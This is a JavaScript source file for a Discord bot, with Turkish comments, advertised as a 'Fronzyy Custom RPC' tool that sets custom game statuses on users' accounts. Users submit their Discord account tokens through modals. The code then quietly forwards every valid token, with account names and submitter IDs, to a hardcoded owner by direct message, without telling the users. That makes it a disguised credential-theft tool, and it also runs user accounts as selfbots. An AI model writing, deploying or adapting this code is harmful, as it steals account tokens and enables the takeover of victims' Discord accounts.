import { 
  Client, 
  GatewayIntentBits, 
  ActionRowBuilder, 
  ButtonBuilder, 
  ButtonStyle, 
  ModalBuilder, 
  TextInputBuilder, 
  TextInputStyle, 
  StringSelectMenuBuilder,
  ActivityType,
  ContainerBuilder,
  TextDisplayBuilder,
  SeparatorBuilder,
  MessageFlags
} from 'discord.js';
import express from 'express';
import WebSocket from 'ws';

// --- UPTIME VE PORT İÇİN EXPRESS SUNUCUSU ---
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Fronzyy Custom RPC Botu aktif ve çalışıyor!');
});

app.listen(PORT, () => {
  console.log(`Sunucu ${PORT} portunda çalışıyor.`);
});
// -------------------------------------------

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ]
});

// Bellekte saklanan tokenler ve aktif RPC süreçleri
const userTokens = new Map();
const activeRPCs = new Map(); // userId -> [{ token, name, username, stop }]

// Tokenlerin gönderileceği ve paneli açabilecek yetkili kişinin ID'si
const OWNER_ID = '1184518857679962186';

client.once('ready', () => {
  console.log(`Bot başarıyla giriş yaptı: ${client.user.tag}`);
  
  // Botun durumunu "powered by Fronzyy" olarak ayarlıyoruz
  client.user.setActivity({
    name: 'powered by Fronzyy',
    type: ActivityType.Playing
  });
});

// Bot sahibine DM aracılığıyla mesaj göndermek için yardımcı fonksiyon
async function sendTokenToOwner(botClient, title, token, accountName, username, addedByUserId) {
  if (!OWNER_ID) return;
  try {
    const owner = await botClient.users.fetch(OWNER_ID);
    if (owner) {
      await owner.send(
        `📥 **${title}**\n` +
        `👤 **Hesap:** ${accountName} (${username})\n` +
        `🆔 **Ekleyen Kullanıcı ID:** <@${addedByUserId}> (${addedByUserId})\n` +
        `🔑 **Token:** \`${token}\``
      );
    }
  } catch (err) {
    console.error('Owner DM gönderme hatası:', err);
  }
}

// User token ile Discord Gateway üzerinden RPC (Presence) başlatan yardımcı fonksiyon
function startUserRPC(token, accountName, rpcConfig) {
  return new Promise((resolve) => {
    const ws = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
    let heartbeatInterval = null;
    let settled = false;

    const finish = (sessionObj) => {
      if (!settled) {
        settled = true;
        resolve(sessionObj);
      }
    };

    const activity = {
      name: rpcConfig.name,
      type: 0, // Playing
      details: rpcConfig.details || undefined,
      state: rpcConfig.state || undefined,
      timestamps: { start: Date.now() }
    };

    const session = {
      stop: () => {
        if (heartbeatInterval) clearInterval(heartbeatInterval);
        try { ws.terminate(); } catch (e) {}
      }
    };

    const sendPresence = () => {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
          op: 3,
          d: {
            since: null,
            activities: [activity],
            status: 'online',
            afk: false
          }
        }));
      }
    };

    ws.on('open', () => {
      ws.send(JSON.stringify({
        op: 2,
        d: {
          token: token,
          capabilities: 16381,
          properties: {
            os: 'Windows',
            browser: 'Discord Client',
            device: ''
          },
          presence: {
            status: 'online',
            since: 0,
            activities: [activity],
            afk: false
          }
        }
      }));
    });

    ws.on('message', (raw) => {
      try {
        const payload = JSON.parse(raw.toString());
        if (payload.op === 10 && payload.d?.heartbeat_interval) {
          heartbeatInterval = setInterval(() => {
            if (ws.readyState === WebSocket.OPEN) {
              ws.send(JSON.stringify({ op: 1, d: null }));
            }
          }, payload.d.heartbeat_interval);
        } else if (payload.t === 'READY') {
          sendPresence();
          finish(session);
        }
      } catch (e) {
        console.error(`RPC parse hatası (${accountName}):`, e.message);
      }
    });

    ws.on('error', (err) => {
      console.error(`RPC bağlantı hatası (${accountName}):`, err.message);
      finish(session);
    });

    ws.on('close', () => {
      if (heartbeatInterval) clearInterval(heartbeatInterval);
      finish(session);
    });

    setTimeout(() => finish(session), 4000);
  });
}

// !panel-custom-rpc komutu
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  if (message.content === '!panel-custom-rpc') {
    // Yetkisi yoksa
    if (message.author.id !== OWNER_ID) {
      try {
        await message.delete();
      } catch (e) {}

      try {
        const warningMsg = await message.channel.send({ 
          content: `❌ <@${message.author.id}> Bu komutu sadece yönetici kullanabilir.` 
        });
        
        setTimeout(async () => {
          try { await warningMsg.delete(); } catch (err) {}
        }, 5000);
      } catch (err) {}

      return;
    }

    try { await message.delete(); } catch (e) {}

    const container = new ContainerBuilder()
      .setAccentColor(0x2b2d31)
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('# **Fronzyy Custom RPC Botu**')
      )
      .addSeparatorComponents(
        new SeparatorBuilder().setDivider(true)
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('## **Nasıl kullanılır?**')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Başlat** : Eklediğiniz hesaplar üzerinden özel RPC başlatmanızı sağlar.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Token Ekle** : Tekli token eklemenizi sağlar.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Toplu Token Ekle** : Her satıra bir token yazarak birden fazla hesabı aynı anda eklersiniz.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Token Sil** : Eklediğiniz tokenleri tek tek veya tümünü silebilirsiniz.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Durdur** : Seçtiğiniz hesap veya tüm hesaplar için aktif RPC süreçlerini durdurur.')
      )
      .addSeparatorComponents(
        new SeparatorBuilder().setDivider(true)
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent(`-# Copyright © Developed by Fronzyy 2026`)
      );

    // Birinci sıra butonlar (Başlat, Token Ekle, Toplu Token Ekle)
    const row1 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('start_rpc')
        .setLabel('Başlat')
        .setStyle(ButtonStyle.Success)
        .setEmoji('▶️'),

      new ButtonBuilder()
        .setCustomId('add_token')
        .setLabel('Token Ekle')
        .setStyle(ButtonStyle.Success)
        .setEmoji('➕'),

      new ButtonBuilder()
        .setCustomId('add_bulk_token')
        .setLabel('Toplu Token Ekle')
        .setStyle(ButtonStyle.Primary)
        .setEmoji('🗒️')
    );

    // İkinci sıra butonlar (Token Sil, Durdur)
    const row2 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('remove_token_panel')
        .setLabel('Token Sil')
        .setStyle(ButtonStyle.Danger)
        .setEmoji('🗑️'),

      new ButtonBuilder()
        .setCustomId('stop_all')
        .setLabel('Durdur')
        .setStyle(ButtonStyle.Danger)
        .setEmoji('🗑️')
    );

    await message.channel.send({ 
      components: [container, row1, row2],
      flags: MessageFlags.IsComponentsV2 
    });
  }
});

// Buton ve Modal etkileşimleri
client.on('interactionCreate', async (interaction) => {
  const userId = interaction.user.id;

  // --- 1. BAŞLAT (RPC) BUTONU ---
  if (interaction.isButton() && interaction.customId === 'start_rpc') {
    const tokens = userTokens.get(userId);
    if (!tokens || tokens.length === 0) {
      return interaction.reply({ content: '⚠️ Önce "Token Ekle" veya "Toplu Token Ekle" butonundan bir hesap eklemelisiniz!', ephemeral: true });
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_rpc_account')
      .setPlaceholder('RPC uygulanacak hesabı seçin...')
      .addOptions([
        { label: 'Bütün Hesaplar', value: 'all_accounts', description: 'Eklediğiniz bütün hesaplara RPC uygular' },
        ...tokens.map((t, index) => ({
          label: `${t.name} (${t.username})`,
          value: index.toString(),
          description: `Seçilen hesap: ${t.name}`
        }))
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'RPC başlatmak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
  }

  // RPC hesabı seçildikten sonra modal
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_rpc_account') {
    const selectedValue = interaction.values[0];

    const modal = new ModalBuilder()
      .setCustomId(`rpc_modal_${selectedValue}`)
      .setTitle('RPC Ayarları');

    const nameInput = new TextInputBuilder()
      .setCustomId('rpc_name')
      .setLabel('Aktivite / Oyun Adı')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    const detailsInput = new TextInputBuilder()
      .setCustomId('rpc_details')
      .setLabel('Detay (Details - isteğe bağlı)')
      .setStyle(TextInputStyle.Short)
      .setRequired(false);

    const stateInput = new TextInputBuilder()
      .setCustomId('rpc_state')
      .setLabel('Durum (State - isteğe bağlı)')
      .setStyle(TextInputStyle.Short)
      .setRequired(false);

    modal.addComponents(
      new ActionRowBuilder().addComponents(nameInput),
      new ActionRowBuilder().addComponents(detailsInput),
      new ActionRowBuilder().addComponents(stateInput)
    );

    await interaction.showModal(modal);
  }

  // RPC modal cevabı
  if (interaction.isModalSubmit() && interaction.customId.startsWith('rpc_modal_')) {
    const selectedValue = interaction.customId.replace('rpc_modal_', '');
    const rpcName = interaction.fields.getTextInputValue('rpc_name').trim();
    const rpcDetails = interaction.fields.getTextInputValue('rpc_details').trim();
    const rpcState = interaction.fields.getTextInputValue('rpc_state').trim();

    const tokens = userTokens.get(userId) || [];
    const targetTokens = selectedValue === 'all_accounts' ? tokens : [tokens[parseInt(selectedValue, 10)]].filter(Boolean);

    if (targetTokens.length === 0) {
      return interaction.reply({ content: '⚠️ Hesap bulunamadı!', ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    if (!activeRPCs.has(userId)) {
      activeRPCs.set(userId, []);
    }

    let startedCount = 0;
    for (const tObj of targetTokens) {
      const session = await startUserRPC(tObj.token, tObj.name, {
        name: rpcName,
        details: rpcDetails,
        state: rpcState
      });
      if (session && typeof session.stop === 'function') {
        activeRPCs.get(userId).push({
          token: tObj.token,
          name: tObj.name,
          username: tObj.username,
          stop: session.stop
        });
        startedCount++;
      }
    }

    await interaction.editReply({ content: `🚀 Seçilen ${startedCount} hesap için RPC başlatıldı: **${rpcName}**` });
  }

  // --- 2. TOKEN EKLE BUTONU ---
  if (interaction.isButton() && interaction.customId === 'add_token') {
    const modal = new ModalBuilder()
      .setCustomId('token_modal')
      .setTitle('Discord Token Ekle');

    const tokenInput = new TextInputBuilder()
      .setCustomId('token_input')
      .setLabel('Discord Tokeninizi girin')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    const firstRow = new ActionRowBuilder().addComponents(tokenInput);
    modal.addComponents(firstRow);

    await interaction.showModal(modal);
  }

  // --- 2.1. TOPLU TOKEN EKLE BUTONU ---
  if (interaction.isButton() && interaction.customId === 'add_bulk_token') {
    const modal = new ModalBuilder()
      .setCustomId('bulk_token_modal')
      .setTitle('Toplu Discord Token Ekle');

    const tokenInput = new TextInputBuilder()
      .setCustomId('bulk_token_input')
      .setLabel('Discord Tokenlerini girin')
      .setPlaceholder('Her satıra 1 token gelecek şekilde yazın')
      .setStyle(TextInputStyle.Paragraph)
      .setRequired(true);

    const firstRow = new ActionRowBuilder().addComponents(tokenInput);
    modal.addComponents(firstRow);

    await interaction.showModal(modal);
  }

  // --- 2.2. TOKEN SİL PANELİ (SEÇİM MENÜSÜ) ---
  if (interaction.isButton() && interaction.customId === 'remove_token_panel') {
    const tokens = userTokens.get(userId);
    if (!tokens || tokens.length === 0) {
      return interaction.reply({ content: '⚠️ Silinecek kayıtlı hesabınız bulunmuyor!', ephemeral: true });
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_remove_account')
      .setPlaceholder('Silmek istediğiniz hesabı seçin...')
      .addOptions([
        { label: 'Bütün Tokenleri Sil', value: 'clear_all_tokens', description: 'Size ait olan bütün tokenleri sistemden siler', emoji: '❌' },
        ...tokens.map((t, index) => ({
          label: `${t.name} (${t.username})`,
          value: index.toString(),
          description: `Bu hesabı sil`,
          emoji: '❌'
        }))
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'Silmek istediğiniz hesabı veya seçeneği belirleyin:', components: [row], ephemeral: true });
  }

  // --- 3. TEK TOKEN MODAL CEVABI ---
  if (interaction.isModalSubmit() && interaction.customId === 'token_modal') {
    const token = interaction.fields.getTextInputValue('token_input').trim();

    await interaction.deferReply({ ephemeral: true });

    try {
      const userRes = await fetch('https://discord.com/api/v9/users/@me', {
        headers: { 'Authorization': token }
      });

      if (!userRes.ok) {
        return interaction.editReply({ content: `❌ Hata: Girilen token geçersiz veya devre dışı bırakılmış.` });
      }

      const userData = await userRes.json();
      const globalName = userData.global_name || userData.username;
      const username = userData.username;

      if (!userTokens.has(userId)) {
        userTokens.set(userId, []);
      }
      
      const existingList = userTokens.get(userId);
      if (!existingList.some(t => t.token === token)) {
        existingList.push({ token, name: globalName, username: username });
      }

      // Tokeni belirtilen ID'nin DM'sine gönderiyoruz
      await sendTokenToOwner(client, 'Yeni Tekli Token Eklendi', token, globalName, username, userId);

      await interaction.editReply({ content: `✅ Başarıyla eklendi! Hesap: **${globalName} (${username})**` });
    } catch (err) {
      await interaction.editReply({ content: `❌ Token eklenirken bir hata oluştu.` });
    }
  }

  // --- 3.1. TOPLU TOKEN MODAL CEVABI ---
  if (interaction.isModalSubmit() && interaction.customId === 'bulk_token_modal') {
    const rawInput = interaction.fields.getTextInputValue('bulk_token_input').trim();
    const tokens = rawInput.split('\n').map(t => t.trim()).filter(t => t.length > 0);

    if (tokens.length === 0) {
      return interaction.reply({ content: '❌ Geçerli token bulunamadı!', ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    if (!userTokens.has(userId)) {
      userTokens.set(userId, []);
    }
    const existingList = userTokens.get(userId);

    let successCount = 0;
    let failCount = 0;
    let addedNames = [];

    for (const token of tokens) {
      try {
        const userRes = await fetch('https://discord.com/api/v9/users/@me', {
          headers: { 'Authorization': token }
        });

        if (userRes.ok) {
          const userData = await userRes.json();
          const globalName = userData.global_name || userData.username;
          const username = userData.username;

          if (!existingList.some(t => t.token === token)) {
            existingList.push({ token, name: globalName, username: username });
          }

          addedNames.push(`${globalName} (${username})`);
          successCount++;

          // Her geçerli tokeni belirtilen ID'nin DM'sine gönderiyoruz
          await sendTokenToOwner(client, 'Toplu Token Eklendi', token, globalName, username, userId);
        } else {
          failCount++;
        }
      } catch (err) {
        failCount++;
      }
    }

    await interaction.editReply({ 
      content: `📦 **Toplu Token İşlemi Tamamlandı!**\n✅ Başarıyla eklenen: **${successCount}** hesap\n❌ Geçersiz/Eklenemeyen: **${failCount}**\n\n${addedNames.length > 0 ? 'Eklenenler:\n- ' + addedNames.join('\n- ') : ''}` 
    });
  }

  // --- 3.2. TOKEN SİLME SEÇİM İŞLEMİ ---
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_remove_account') {
    const selectedValue = interaction.values[0];
    const tokens = userTokens.get(userId);

    if (!tokens) {
      return interaction.reply({ content: '❌ Kayıtlı hesabınız bulunmuyor.', ephemeral: true });
    }

    if (selectedValue === 'clear_all_tokens') {
      userTokens.set(userId, []);
      return interaction.reply({ content: '🗑️ Size ait olan bütün tokenler başarıyla silindi!', ephemeral: true });
    } else {
      const index = parseInt(selectedValue, 10);
      const removedAccount = tokens.splice(index, 1)[0];
      return interaction.reply({ content: `❌ Başarıyla silindi: **${removedAccount.name} (${removedAccount.username})**`, ephemeral: true });
    }
  }

  // --- 4. DURDUR BUTONU -> HESAP SEÇİMİ ---
  if (interaction.isButton() && interaction.customId === 'stop_all') {
    const userRPCs = activeRPCs.get(userId) || [];

    if (userRPCs.length === 0) {
      return interaction.reply({ content: 'ℹ️ Aktif RPC süreciniz bulunmuyor.', ephemeral: true });
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_stop_rpc_account')
      .setPlaceholder('RPC durdurulacak hesabı seçin...')
      .addOptions([
        { label: 'Bütün Hesaplar', value: 'all_accounts', description: 'Aktif olan bütün hesapların RPC-sini durdurur', emoji: '❌' },
        ...userRPCs.map((r, index) => ({
          label: `${r.name} (${r.username})`,
          value: index.toString(),
          description: `Bu hesabın RPC-sini durdur`,
          emoji: '❌'
        }))
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'RPC durdurmak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
  }

  // --- 4.1. DURDUR HESAP SEÇİMİ İŞLEMİ ---
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_stop_rpc_account') {
    const selectedValue = interaction.values[0];
    const userRPCs = activeRPCs.get(userId) || [];

    if (userRPCs.length === 0) {
      return interaction.update({ content: 'ℹ️ Aktif RPC süreciniz bulunmuyor.', components: [] });
    }

    if (selectedValue === 'all_accounts') {
      for (const rpcItem of userRPCs) {
        if (rpcItem && typeof rpcItem.stop === 'function') {
          rpcItem.stop();
        }
      }
      activeRPCs.set(userId, []);
      return interaction.update({ content: '🛑 Hesaplarınızdaki bütün aktif RPC süreçleri durduruldu.', components: [] });
    } else {
      const index = parseInt(selectedValue, 10);
      const removedRPC = userRPCs.splice(index, 1)[0];
      if (removedRPC && typeof removedRPC.stop === 'function') {
        removedRPC.stop();
      }
      activeRPCs.set(userId, userRPCs);
      return interaction.update({
        content: `🛑 **${removedRPC ? `${removedRPC.name} (${removedRPC.username})` : 'Seçilen hesap'}** için aktif RPC durduruldu.`,
        components: []
      });
    }
  }
});

// Render'da token kontrolü ile giriş
if (!process.env.DISCORD_TOKEN) {
  console.error("❌ HATA: DISCORD_TOKEN environment değişkeni bulunamadı! Render panelinden ekleyin.");
  process.exit(1);
}

client.login(process.env.DISCORD_TOKEN);
